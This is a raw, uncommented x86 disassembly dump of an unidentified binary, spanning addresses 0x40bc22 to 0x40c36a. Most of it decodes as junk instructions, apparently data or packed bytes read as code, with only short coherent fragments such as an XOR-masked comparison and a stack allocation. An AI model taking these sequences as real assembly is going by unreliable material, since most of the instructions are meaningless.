  40bc22:	mov    bl,0x9
  40bc24:	inc    edi
  40bc25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc26:	out    0x5f,al
  40bc28:	(bad)  
  40bc29:	jmp    0xa2d316f9
  40bc2e:	ja     0x40bc48
  40bc30:	ins    DWORD PTR es:[edi],dx
  40bc31:	loop   0x40bc10
  40bc33:	sub    al,0x38
  40bc35:	je     0x40bcaf
  40bc37:	sbb    eax,0xe590c42d
  40bc3c:	jb     0x40bc0e
  40bc3e:	leave  
  40bc3f:	mov    ds:0xb923828c,eax
  40bc44:	push   0xffffff8c
  40bc46:	jns    0x40bc69
  40bc48:	push   ebx
  40bc49:	pop    ds
  40bc4a:	inc    DWORD PTR [ebx+ebp*2]
  40bc4d:	adc    esi,ebx
  40bc4f:	jle    0x40bc0b
  40bc51:	and    esi,DWORD PTR [edx+0x68]
  40bc54:	and    al,0xb1
  40bc56:	dec    eax
  40bc57:	adc    ecx,DWORD PTR [ecx-0x1d]
  40bc5a:	dec    ecx
  40bc5b:	pop    esp
  40bc5c:	sbb    bh,ch
  40bc5e:	dec    edx
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	nop
  40bc96:	cwde   
  40bc97:	and    eax,0x7efbc668
  40bc9c:	jle    0x40bcd6
  40bc9e:	jl     0x40bd1e
  40bca0:	jle    0x40bca8
  40bca2:	sub    al,0x2a
  40bca4:	aad    0xe5
  40bca6:	mov    eax,ds:0xe005d294
  40bcab:	outs   dx,DWORD PTR es:[esi]
  40bcad:	comiss xmm2,DWORD PTR [ebx+0x7e0bea12]
  40bcb4:	stos   DWORD PTR es:[edi],eax
  40bcb5:	and    eax,0x22282f6a
  40bcba:	or     BYTE PTR [eax-0x485795fe],cl
  40bcc0:	inc    DWORD PTR [edx-0x53]
  40bcc3:	repnz mov dh,0x90
  40bcc6:	push   es
  40bcc7:	jp     0x40bcc3
  40bcc9:	bound  eax,QWORD PTR [eax-0x7372cc05]
  40bccf:	or     al,0xeb
  40bcd1:	pop    esp
  40bcd2:	push   edi
  40bcd3:	ins    DWORD PTR es:[edi],dx
  40bcd4:	neg    BYTE PTR [esi-0x12]
  40bcd7:	int    0x94
  40bcd9:	div    cl
  40bcdb:	lds    esp,FWORD PTR [edx]
  40bcdd:	bound  esi,QWORD PTR [edi]
  40bcdf:	and    eax,0x21fcf58
  40bce4:	adc    al,0x6b
  40bce6:	int    0xa8
  40bce8:	fnsave [edi+0x4d8ac179]
  40bcee:	mov    dl,0x72
  40bcf0:	cmp    DWORD PTR [ebp-0x32],ecx
  40bcf3:	(bad)  
  40bcf4:	cmp    DWORD PTR [edi],ecx
  40bcf6:	loop   0x40bd3f
  40bcf8:	imul   bl
  40bcfa:	retf   0xca4f
  40bcfd:	lods   al,BYTE PTR ds:[esi]
  40bcfe:	add    ch,ah
  40bd00:	pop    ebp
  40bd01:	push   ecx
  40bd02:	push   ecx
  40bd03:	aad    0x72
  40bd05:	or     ebx,0xe0689002
  40bd0b:	pop    ds
  40bd0c:	adc    al,0xba
  40bd0e:	jle    0x40bcfa
  40bd10:	push   ebp
  40bd11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd12:	inc    ebx
  40bd13:	cwde   
  40bd14:	push   ebp
  40bd15:	mov    dh,0xc1
  40bd17:	call   0xcbc7497a
  40bd1c:	sub    al,0x43
  40bd1e:	aaa    
  40bd1f:	or     al,0x88
  40bd21:	sbb    eax,0xdbd4cd6d
  40bd26:	xchg   edx,eax
  40bd27:	and    eax,edi
  40bd29:	sub    BYTE PTR [edi+esi*1+0x32],dl
  40bd2d:	mov    esp,0xabaae207
  40bd32:	jne    0x40bd60
  40bd34:	jb     0x40bce5
  40bd36:	data16 mov ah,BYTE PTR [ebx+0x2f]
  40bd3a:	and    al,0xe9
  40bd3c:	loopne 0x40bd5e
  40bd3e:	arpl   cx,bp
  40bd40:	pop    ecx
  40bd41:	icebp  
  40bd42:	les    ebp,FWORD PTR [ebx-0x5a]
  40bd45:	inc    edx
  40bd46:	xchg   esi,eax
  40bd47:	pop    edx
  40bd48:	xchg   esi,eax
  40bd49:	mov    ebp,esi
  40bd4b:	repz adc eax,0x3a335638
  40bd51:	push   0x3d
  40bd53:	mov    dl,0xc2
  40bd55:	(bad)  
  40bd56:	pop    eax
  40bd57:	lods   al,BYTE PTR ds:[esi]
  40bd58:	cwde   
  40bd59:	pop    es
  40bd5a:	data16 daa 
  40bd5c:	fcomp  QWORD PTR [eax]
  40bd5e:	icebp  
  40bd5f:	pop    edx
  40bd60:	addr16 cwde 
  40bd62:	ja     0x40bd77
  40bd64:	out    0xf6,al
  40bd66:	test   DWORD PTR [ebp+0x4b],edx
  40bd69:	push   edx
  40bd6b:	or     BYTE PTR [edx],dh
  40bd6d:	out    0x6a,eax
  40bd6f:	sub    DWORD PTR [esi-0x1649a76c],esp
  40bd75:	xor    eax,0x97d4a55f
  40bd7a:	push   0x36
  40bd7c:	xchg   edx,eax
  40bd7d:	add    al,0x94
  40bd7f:	push   esp
  40bd80:	push   ebp
  40bd81:	lods   al,BYTE PTR ds:[esi]
  40bd82:	clc    
  40bd83:	xchg   BYTE PTR [ebp-0x46],cl
  40bd86:	int    0x37
  40bd88:	mov    ebx,0x841c6f19
  40bd8d:	mov    ah,0x39
  40bd8f:	cmp    eax,0xcb2b4616
  40bd94:	mov    ch,0x52
  40bd96:	sbb    ebp,DWORD PTR [ecx-0xe]
  40bd99:	dec    ebp
  40bd9a:	jl     0x40bdd5
  40bd9c:	int3   
  40bd9d:	xor    ecx,DWORD PTR [edi-0x442c7ee9]
  40bda3:	push   0x3e863f0
  40bda8:	adc    ah,BYTE PTR [ebx+0x29]
  40bdab:	sbb    al,0x76
  40bdad:	cmp    al,0xd
  40bdaf:	push   ebx
  40bdb0:	push   edi
  40bdb1:	retf   0x11a8
  40bdb4:	jle    0x40bdc2
  40bdb6:	popf   
  40bdb7:	xchg   esi,eax
  40bdb8:	std    
  40bdb9:	fstp   QWORD PTR [edi+0x14bd2f7f]
  40bdbf:	lahf   
  40bdc0:	pop    eax
  40bdc1:	mov    WORD PTR [edi],es
  40bdc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdc4:	inc    edx
  40bdc5:	daa    
  40bdc6:	mov    al,0x7
  40bdc8:	ficom  DWORD PTR [edi-0x37b0c089]
  40bdce:	es mov bl,0x7c
  40bdd1:	ret    0x731f
  40bdd4:	out    0x56,al
  40bdd6:	dec    eax
  40bdd7:	jmp    0x6a374961
  40bddc:	add    DWORD PTR [ecx+0x59f6257e],esp
  40bde2:	dec    edi
  40bde3:	sub    cl,cl
  40bde5:	sub    eax,DWORD PTR [esi]
  40bde7:	push   0x1a60b733
  40bdec:	scas   al,BYTE PTR es:[edi]
  40bded:	stos   DWORD PTR es:[edi],eax
  40bdee:	mov    ebp,0x7b81c770
  40bdf3:	and    ebx,DWORD PTR [esp+eax*1+0x7da12a1d]
  40bdfa:	fst    st(7)
  40bdfc:	xor    dh,BYTE PTR [ebp-0x66]
  40bdff:	sar    dl,cl
  40be01:	push   ebx
  40be02:	adc    eax,0x29ca91dc
  40be07:	(bad)  
  40be08:	(bad)  
  40be09:	test   al,0x5a
  40be0b:	dec    esi
  40be0c:	xchg   DWORD PTR [edx+0x54],edx
  40be0f:	pop    ebx
  40be10:	push   esp
  40be11:	in     al,dx
  40be12:	xchg   DWORD PTR [esi+0x4f],ebx
  40be15:	in     al,0xaa
  40be17:	xchg   edx,eax
  40be18:	je     0x40be80
  40be1a:	pop    edx
  40be1b:	fild   WORD PTR [esi+edx*4-0x63]
  40be1f:	loope  0x40be44
  40be21:	jmp    0x40bdfa
  40be23:	fmul   QWORD PTR [ecx+0x67]
  40be26:	push   esi
  40be27:	cmp    edx,esp
  40be29:	sub    cl,BYTE PTR [ebx+0x54]
  40be2c:	test   ecx,0xd97a8f53
  40be32:	mov    ebp,0xed7b68bf
  40be37:	retf   0xcc4d
  40be3a:	gs jno 0x40be5a
  40be3d:	outs   dx,BYTE PTR ds:[esi]
  40be3e:	jbe    0x40be94
  40be40:	sbb    bl,BYTE PTR [eax+0x7d74d6e9]
  40be46:	imul   ebx,edi,0x15773f20
  40be4c:	dec    esi
  40be4d:	cmp    BYTE PTR [edi+0x3a],0x25
  40be51:	jmp    0x40bec0
  40be53:	add    al,0xfa
  40be55:	dec    esi
  40be56:	pop    esp
  40be57:	popf   
  40be58:	cld    
  40be59:	lock adc al,0xa2
  40be5c:	je     0x40bec6
  40be5e:	sbb    DWORD PTR [edx],ebp
  40be60:	int3   
  40be61:	sub    eax,ecx
  40be63:	(bad)  
  40be65:	mov    ss,WORD PTR [edi+0x10]
  40be68:	fist   WORD PTR [edi-0x413acd75]
  40be6e:	popf   
  40be6f:	add    dl,ah
  40be71:	mov    al,ds:0xd8da58b2
  40be76:	mov    esi,0x7a0acdab
  40be7b:	push   cs
  40be7c:	cmp    ah,ah
  40be7e:	cmp    cl,ah
  40be80:	arpl   WORD PTR [esi-0x60],bp
  40be83:	sub    eax,0x958c83e0
  40be88:	xchg   edx,eax
  40be89:	fnstenv [ebp+0x2a]
  40be8c:	xor    al,0xe0
  40be8e:	sbb    dl,bl
  40be90:	cli    
  40be91:	fnstenv [eax]
  40be93:	ins    DWORD PTR es:[edi],dx
  40be94:	cs xchg ebp,eax
  40be96:	jns    0x40beef
  40be98:	add    eax,0x4be444c0
  40be9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be9e:	fdiv   DWORD PTR [edx+ebp*1-0x7e94bfbf]
  40bea5:	inc    ebx
  40bea6:	or     DWORD PTR [ecx+0x167cded5],ebp
  40beac:	pop    ebp
  40bead:	loope  0x40be4e
  40beaf:	or     edi,eax
  40beb1:	sub    eax,0xbd8582c3
  40beb6:	mov    ch,0xba
  40beb8:	out    dx,eax
  40beb9:	fwait
  40beba:	and    esp,DWORD PTR [ebx]
  40bebc:	xchg   bl,dl
  40bebe:	lods   eax,DWORD PTR ds:[esi]
  40bebf:	jnp    0x40bedd
  40bec1:	hlt    
  40bec2:	xor    al,0x9f
  40bec4:	ror    dl,1
  40bec6:	pusha  
  40bec7:	rol    eax,1
  40bec9:	add    cl,BYTE PTR [edi-0x5e9dfe0b]
  40becf:	and    eax,0xd46d9d26
  40bed4:	jle    0x40bf22
  40bed6:	aam    0x14
  40bed8:	cmp    dl,al
  40beda:	ss push eax
  40bedc:	push   edx
  40bedd:	mov    ebx,0x5b725b02
  40bee2:	xchg   ebx,eax
  40bee3:	sbb    eax,0x359ef8e5
  40bee8:	push   esp
  40bee9:	or     BYTE PTR [ecx+0x7],dl
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x395640cf]
  40bf27:	cmp    DWORD PTR [eax+0x387e7ef9],eax
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf4a
  40bf31:	fs loope 0x40bef4
  40bf34:	xlat   BYTE PTR ds:[ebx]
  40bf35:	aad    0x9b
  40bf37:	cli    
  40bf38:	ins    DWORD PTR es:[edi],dx
  40bf39:	(bad)  
  40bf3b:	push   eax
  40bf3c:	rcr    BYTE PTR [ecx+0x4],cl
  40bf3f:	and    DWORD PTR [eax-0x29a34ce1],ebx
  40bf45:	call   0xfa4df24c
  40bf4a:	dec    edi
  40bf4b:	push   edx
  40bf4c:	cmc    
  40bf4d:	pop    es
  40bf4e:	inc    ecx
  40bf4f:	xlat   BYTE PTR ds:[ebx]
  40bf50:	sbb    ebx,DWORD PTR [esi-0x15472377]
  40bf56:	mov    al,ds:0xf387827b
  40bf5b:	sub    eax,0x5c9e7711
  40bf60:	loop   0x40bfb4
  40bf62:	xchg   esp,eax
  40bf63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf64:	mov    dl,0x5d
  40bf66:	xor    DWORD PTR [eax+0x2b],ebx
  40bf69:	rcr    DWORD PTR [ebp+0x435ea938],cl
  40bf6f:	push   ss
  40bf70:	aas    
  40bf71:	xchg   ecx,eax
  40bf72:	(bad)  
  40bf73:	jae    0x40bff3
  40bf75:	mov    ebp,0xffe281f4
  40bf7a:	stos   DWORD PTR es:[edi],eax
  40bf7b:	or     edi,DWORD PTR [ecx]
  40bf7d:	sbb    DWORD PTR [ecx],edi
  40bf7f:	imul   ebp,ecx,0xffffffda
  40bf82:	sub    eax,0xb162b597
  40bf87:	sbb    esp,ecx
  40bf89:	push   0x43
  40bf8b:	xchg   esp,eax
  40bf8c:	pop    edi
  40bf8d:	dec    edi
  40bf8e:	stos   DWORD PTR es:[edi],eax
  40bf8f:	push   ds
  40bf90:	inc    ecx
  40bf91:	cmp    eax,0x7fafba14
  40bf96:	push   ss
  40bf97:	pop    ss
  40bf98:	pop    edx
  40bf99:	add    bl,0x43
  40bf9c:	arpl   di,sp
  40bf9e:	fdiv   st(7),st
  40bfa0:	and    eax,0xa51080ea
  40bfa5:	mov    eax,ds:0x31228370
  40bfaa:	cmp    BYTE PTR [eax+0x42feb754],bh
  40bfb0:	adc    BYTE PTR [ebp-0x16423a1a],cl
  40bfb6:	push   esi
  40bfb7:	lods   al,BYTE PTR ds:[esi]
  40bfb8:	sub    DWORD PTR [edi-0x611f0eb0],eax
  40bfbe:	std    
  40bfbf:	cwde   
  40bfc0:	jg     0x40c015
  40bfc2:	cmp    eax,0x2cab6db
  40bfc8:	mov    ds:0xc5a0499,al
  40bfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfce:	je     0x40bfe6
  40bfd0:	mov    al,ds:0xb28bec40
  40bfd5:	mov    dh,0x60
  40bfd7:	mov    ebx,0xe7d235a3
  40bfdc:	loop   0x40bfe4
  40bfde:	xchg   ecx,eax
  40bfdf:	sbb    dh,BYTE PTR ss:[ecx-0x32641da5]
  40bfe6:	imul   edi,DWORD PTR ds:0x494cb103,0x1026148c
  40bff0:	fcomp  DWORD PTR [ecx]
  40bff2:	retf   
  40bff3:	rol    eax,1
  40bff5:	sbb    dh,BYTE PTR [esi+0x45]
  40bff8:	repnz sub al,0x52
  40bffb:	hlt    
  40bffc:	jg     0x40c006
  40bffe:	and    ebx,ebx
  40c000:	int    0x7
  40c002:	add    esi,ebx
  40c004:	jbe    0x40bff7
  40c006:	jle    0x40c015
  40c008:	fwait
  40c009:	mov    esp,0xdfde29e9
  40c00e:	stos   BYTE PTR es:[edi],al
  40c00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c010:	cmp    eax,0x6b590c29
  40c015:	adc    al,0xa1
  40c017:	call   0x8a232c38
  40c01c:	mov    BYTE PTR [eax-0x194e23e2],bl
  40c022:	inc    eax
  40c023:	jne    0x40bfee
  40c025:	enter  0x2801,0x6e
  40c029:	imul   ecx,DWORD PTR [ebx+ebp*1+0x29779185],0xcdba0d10
  40c034:	aaa    
  40c035:	pop    ds
  40c036:	bound  ecx,QWORD PTR [edx]
  40c038:	outs   dx,DWORD PTR ds:[esi]
  40c039:	xchg   ebx,eax
  40c03a:	pop    edi
  40c03b:	mov    ecx,0xdf72a236
  40c040:	inc    eax
  40c041:	fucomip st,st(5)
  40c043:	xchg   edi,eax
  40c044:	pop    ebp
  40c045:	inc    edi
  40c046:	iret   
  40c047:	xor    eax,esp
  40c049:	adc    eax,0x39b7305f
  40c04e:	je     0x40c076
  40c050:	xor    eax,0x9b2c6341
  40c055:	mov    ds:0xd1e7d461,eax
  40c05a:	ficom  DWORD PTR [esi+0x20]
  40c05d:	xchg   ebp,eax
  40c05e:	out    dx,al
  40c05f:	not    BYTE PTR [eax]
  40c061:	gs scas al,BYTE PTR es:[edi]
  40c063:	rcr    DWORD PTR [ebx],cl
  40c065:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c067:	fwait
  40c068:	mov    esp,DWORD PTR [ecx-0x2c150dc6]
  40c06e:	or     al,0x91
  40c070:	dec    ecx
  40c071:	sbb    ebp,DWORD PTR [ebp+0x81b6587]
  40c077:	dec    ecx
  40c078:	outs   dx,BYTE PTR ds:[esi]
  40c079:	xchg   dh,dh
  40c07b:	pop    ebp
  40c07c:	imul   ecx,ebp,0xffffff87
  40c07f:	xor    eax,0x9937a4d7
  40c084:	rcl    DWORD PTR [eax+0x4f],0x7b
  40c088:	jns    0x40c104
  40c08a:	jae    0x40c0de
  40c08c:	cmp    BYTE PTR [esi+0x51776527],bl
  40c092:	ror    BYTE PTR gs:[ecx+edi*8],0x60
  40c097:	(bad)  
  40c098:	sub    eax,0x8e3cd139
  40c09d:	adc    DWORD PTR [ebx],edx
  40c09f:	push   cs
  40c0a0:	jbe    0x40c08f
  40c0a2:	or     eax,0xb1949b3c
  40c0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a8:	pop    ebp
  40c0a9:	stos   DWORD PTR es:[edi],eax
  40c0aa:	mov    al,BYTE PTR [eax]
  40c0ac:	or     eax,0x42c16a1b
  40c0b1:	mov    esp,ecx
  40c0b3:	lods   eax,DWORD PTR ds:[esi]
  40c0b4:	fs mov esi,0x439367bc
  40c0ba:	repnz out 0x81,eax
  40c0bd:	cmp    bh,dh
  40c0bf:	out    0x5f,eax
  40c0c1:	inc    ebp
  40c0c2:	std    
  40c0c3:	(bad)  
  40c0c4:	xor    eax,0x339f28f3
  40c0c9:	jno    0x40c053
  40c0cb:	ja     0x40c0e4
  40c0cd:	leave  
  40c0ce:	popa   
  40c0cf:	bound  eax,QWORD PTR [edi+0x24d620e1]
  40c0d5:	int    0x91
  40c0d7:	mov    dl,0x72
  40c0d9:	adc    DWORD PTR [edx],eax
  40c0db:	psubsw mm1,QWORD PTR [ecx]
  40c0de:	test   al,0x9
  40c0e0:	(bad)  
  40c0e1:	hlt    
  40c0e2:	jl     0x40c0e5
  40c0e4:	std    
  40c0e5:	mov    ds:0xd0c914b0,eax
  40c0ea:	sbb    DWORD PTR [esi-0x71],ecx
  40c0ed:	iret   
  40c0ee:	loopne 0x40c116
  40c0f0:	xor    ebx,DWORD PTR [ecx+0x77ea2e9d]
  40c0f6:	cli    
  40c0f7:	add    bl,ch
  40c0f9:	mov    al,ds:0x5500efb6
  40c0fe:	(bad)  
  40c0ff:	dec    ebp
  40c100:	pushf  
  40c101:	shr    edx,cl
  40c103:	xor    DWORD PTR [edx],0x6668b5aa
  40c109:	xchg   ebx,eax
  40c10a:	mul    edi
  40c10c:	or     esi,ebp
  40c10e:	mov    ebp,0x657b7a0a
  40c113:	dec    ecx
  40c114:	dec    eax
  40c115:	les    ebx,FWORD PTR [edi-0x68a3474d]
  40c11b:	dec    esp
  40c11c:	dec    edi
  40c11d:	(bad)  
  40c11e:	int3   
  40c11f:	scas   al,BYTE PTR es:[edi]
  40c120:	mov    ch,0x6a
  40c122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c123:	xor    al,0xa3
  40c125:	xor    al,0xdb
  40c127:	icebp  
  40c128:	mov    edi,0xe37c61fa
  40c12d:	pop    es
  40c12e:	int    0x3c
  40c130:	fcomip st,st(3)
  40c132:	push   ebp
  40c133:	adc    eax,0xbc03749a
  40c138:	sub    esp,DWORD PTR [ebx-0x3c]
  40c13b:	mov    dh,0xa1
  40c13d:	out    0x1,eax
  40c13f:	daa    
  40c140:	test   al,0x15
  40c142:	push   edx
  40c143:	(bad)  
  40c144:	fcmovne st,st(7)
  40c146:	imul   edx,DWORD PTR [edx],0x39
  40c149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c14a:	cld    
  40c14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c14c:	(bad)  
  40c14d:	nop
  40c14e:	add    esi,edi
  40c150:	push   0x1b6ea2d5
  40c155:	cs stos DWORD PTR es:[edi],eax
  40c157:	bound  edx,QWORD PTR [ecx+esi*1]
  40c15a:	ss cmp al,0xe8
  40c15d:	jmp    0x40c110
  40c15f:	lock push ss
  40c161:	iret   
  40c162:	pop    esi
  40c163:	mov    bl,0x7a
  40c165:	pop    ss
  40c166:	ins    DWORD PTR es:[edi],dx
  40c167:	jecxz  0x40c11d
  40c169:	jno    0x40c13f
  40c16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c16d:	jmp    0xc234:0x6af7071d
  40c174:	neg    dh
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x47
  40c196:	rol    ah,0x2b
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	mov    eax,cs:0x5f615256
  40c1a7:	and    edx,edi
  40c1a9:	bound  edi,QWORD PTR [ebx+esi*2+0x2c]
  40c1ad:	stc    
  40c1ae:	add    esi,0xac8b090b
  40c1b4:	xchg   ebx,eax
  40c1b5:	push   ds
  40c1b6:	fst    QWORD PTR [esi-0x2e]
  40c1b9:	mov    dl,bh
  40c1bb:	pop    edx
  40c1bc:	test   BYTE PTR ss:[edi],al
  40c1bf:	es mov cl,0x87
  40c1c2:	mov    al,0xaa
  40c1c4:	clc    
  40c1c5:	and    DWORD PTR [edx-0x3],eax
  40c1c8:	sub    al,0x9b
  40c1ca:	rcl    DWORD PTR [ebx],1
  40c1cc:	shl    BYTE PTR [ecx+0x302c8f3d],cl
  40c1d2:	xor    eax,ebp
  40c1d4:	fcom   QWORD PTR [ebp-0x770b1900]
  40c1da:	lds    edx,FWORD PTR [edx+0x45]
  40c1dd:	rcr    DWORD PTR [eax-0x70],1
  40c1e0:	and    BYTE PTR ds:0x7bf458ee,bh
  40c1e6:	mov    BYTE PTR [eax],bl
  40c1e8:	add    eax,0x5e142ec4
  40c1ed:	fsincos 
  40c1ef:	pop    es
  40c1f0:	jle    0x40c195
  40c1f2:	pop    ecx
  40c1f3:	loopne 0x40c1f5
  40c1f5:	inc    esp
  40c1f6:	xchg   esp,eax
  40c1f7:	sahf   
  40c1f8:	and    eax,0xa551c92a
  40c1fd:	fisubr DWORD PTR [edx-0x2dc4b94b]
  40c203:	leave  
  40c204:	lock aad 0x29
  40c207:	dec    esp
  40c208:	mov    ds:0xf3dc4154,al
  40c20d:	ins    BYTE PTR es:[edi],dx
  40c20e:	ficomp DWORD PTR [bx+di+0x1]
  40c212:	int3   
  40c213:	mov    DWORD PTR [ebx+ebp*2],0xf354f9db
  40c21a:	mov    cs,WORD PTR [edx+0x5d]
  40c21d:	inc    esi
  40c21e:	push   ebp
  40c21f:	adc    eax,0x20fa2548
  40c224:	aad    0xdd
  40c226:	push   es
  40c227:	ins    DWORD PTR es:[edi],dx
  40c228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c229:	hlt    
  40c22a:	adc    edi,eax
  40c22c:	in     al,0xe3
  40c22e:	leave  
  40c22f:	mov    al,ds:0xc65e8926
  40c234:	lds    eax,FWORD PTR [esi-0x76226fc9]
  40c23a:	push   esp
  40c23b:	fild   QWORD PTR [edx+esi*4-0x60]
  40c23f:	cmp    eax,0x1aa17f4a
  40c244:	or     al,0x66
  40c246:	add    edi,DWORD PTR [ebx*2+0x490084bf]
  40c24d:	adc    dh,BYTE PTR [edi]
  40c24f:	(bad)  
  40c251:	dec    ecx
  40c252:	xchg   ecx,eax
  40c253:	pop    ebx
  40c254:	std    
  40c255:	fidivr DWORD PTR [ecx-0x36e68df6]
  40c25b:	fnstcw WORD PTR [ecx]
  40c25d:	test   DWORD PTR [ebx],0x54ab1020
  40c263:	and    DWORD PTR [edi+0x10d861f7],ebp
  40c269:	push   esp
  40c26a:	jmp    0x88b8:0x2e7fcd9d
  40c271:	ror    BYTE PTR cs:[edi+0x6d],cl
  40c275:	in     eax,dx
  40c276:	mov    eax,0xc95c2857
  40c27b:	popa   
  40c27c:	adc    BYTE PTR [edi+0x17fdfeae],cl
  40c282:	xchg   ebp,eax
  40c283:	push   esp
  40c284:	ins    DWORD PTR es:[edi],dx
  40c285:	stc    
  40c286:	mov    gs,edi
  40c288:	imul   eax,DWORD PTR [edx+0x6d],0xb57d231f
  40c28f:	pop    ss
  40c290:	data16 cli 
  40c292:	inc    ebx
  40c293:	add    BYTE PTR [edx-0x3c],al
  40c296:	jle    0x40c250
  40c298:	fiadd  DWORD PTR ds:0x1606162f
  40c29e:	loope  0x40c2e8
  40c2a0:	mov    ebx,0x7b70e148
  40c2a5:	popa   
  40c2a6:	mov    ds:0x725e6e9b,eax
  40c2ab:	inc    eax
  40c2ac:	sbb    BYTE PTR [edx+eax*8-0x44a5ac42],dh
  40c2b3:	xchg   edi,eax
  40c2b4:	es rcr ecx,cl
  40c2b7:	stos   BYTE PTR es:[edi],al
  40c2b8:	mov    WORD PTR [ecx-0x79],gs
  40c2bb:	out    0xdd,eax
  40c2bd:	sti    
  40c2be:	frstor [ecx+0x5de9381e]
  40c2c4:	loope  0x40c24b
  40c2c6:	mov    eax,ds:0x3a22b01e
  40c2cb:	sbb    esi,DWORD PTR [edx-0x46]
  40c2ce:	inc    ecx
  40c2cf:	jns    0x40c349
  40c2d1:	pop    ds
  40c2d2:	dec    esi
  40c2d3:	mov    ebx,gs
  40c2d5:	gs (bad) 
  40c2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d8:	sbb    esp,DWORD PTR [ecx]
  40c2da:	xor    dh,BYTE PTR [esi]
  40c2dc:	mov    al,0xee
  40c2de:	push   ebp
  40c2df:	xchg   DWORD PTR [esi],ecx
  40c2e1:	inc    esi
  40c2e2:	rcpps  xmm7,xmm7
  40c2e5:	cwde   
  40c2e6:	scas   al,BYTE PTR es:[edi]
  40c2e7:	test   al,0xb9
  40c2e9:	mov    es,esp
  40c2eb:	adc    al,0xa
  40c2ed:	aaa    
  40c2ee:	fidiv  WORD PTR ds:0x2968f4ad
  40c2f4:	outs   dx,DWORD PTR ds:[esi]
  40c2f6:	loope  0x40c2e0
  40c2f8:	cwde   
  40c2f9:	fcom   st(2)
  40c2fb:	in     al,dx
  40c2fc:	hlt    
  40c2fd:	dec    edi
  40c2fe:	jecxz  0x40c36b
  40c300:	fs sub al,0xd6
  40c303:	jae    0x40c375
  40c305:	fisttp QWORD PTR [edi+0x27a66dae]
  40c30b:	lods   eax,DWORD PTR cs:[esi]
  40c30d:	xor    al,0xeb
  40c30f:	mov    edi,DWORD PTR [ebx+0x2a7ad768]
  40c315:	add    al,0x65
  40c317:	add    BYTE PTR ds:0xca0cb7f7,ah
  40c31d:	daa    
  40c31e:	sub    DWORD PTR [eax-0x3d],ebx
  40c321:	jmp    0xa4be:0x9456098d
  40c328:	fild   WORD PTR [ebx+0x2b]
  40c32b:	cld    
  40c32c:	fxch   st(6)
  40c32e:	gs or  al,0xfc
  40c331:	aad    0x8d
  40c333:	mov    es,WORD PTR [eax]
  40c335:	dec    esp
  40c336:	test   DWORD PTR [esi-0x3a0f6d0a],ebp
  40c33c:	loop   0x40c334
  40c33e:	xlat   BYTE PTR ds:[ebx]
  40c33f:	jb     0x40c34a
  40c341:	cmp    ebx,ebx
  40c343:	int    0x5f
  40c345:	arpl   WORD PTR [ecx+0x66fc983f],cx
  40c34b:	shr    BYTE PTR es:[edi],cl
  40c34e:	inc    esp
  40c34f:	in     al,0xa0
  40c351:	retf   0xb0b9
  40c354:	arpl   WORD PTR [esi],cx
  40c356:	mov    WORD PTR [eax-0x1ad4a7f0],?
  40c35c:	repnz or cl,bl
  40c35f:	inc    esi
  40c360:	outs   dx,BYTE PTR ds:[esi]
  40c361:	adc    al,0x49
  40c363:	shl    DWORD PTR [eax-0x15],0xd3
  40c367:	dec    edx
  40c368:	and    BYTE PTR [eax],dh
  40c36a:	xor    eax,0x9eb29d96
